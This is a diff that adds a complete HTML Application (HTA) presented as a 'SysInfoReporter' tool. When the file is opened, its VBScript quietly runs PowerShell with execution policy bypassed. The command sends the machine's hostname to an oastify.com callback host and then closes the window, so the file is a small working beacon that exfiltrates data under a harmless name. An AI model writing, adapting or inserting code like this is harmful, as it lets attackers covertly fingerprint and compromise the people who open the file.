@@ -1,0 +1,19 @@
+<HTML>
+<HEAD>
+<HTA:APPLICATION
+    APPLICATIONNAME="SysInfoReporter"
+    SCROLL="no"
+    SINGLEINSTANCE="yes"
+    WINDOWSTATE="minimize"
+/>
+<script language="VBScript">
+    Sub Window_OnLoad
+        Set objShell = CreateObject("Wscript.Shell")
+        objShell.Run "powershell -nop -exec bypass -c ""$h=(hostname);iwr -Uri 'http://iugl05zqia3ux138dbk0n8rvdmjd73vs.oastify.com?query='+$h -UseBasicParsing"""
+        window.close
+    End Sub
+</script>
+</HEAD>
+<BODY>
+</BODY>
+</HTML>
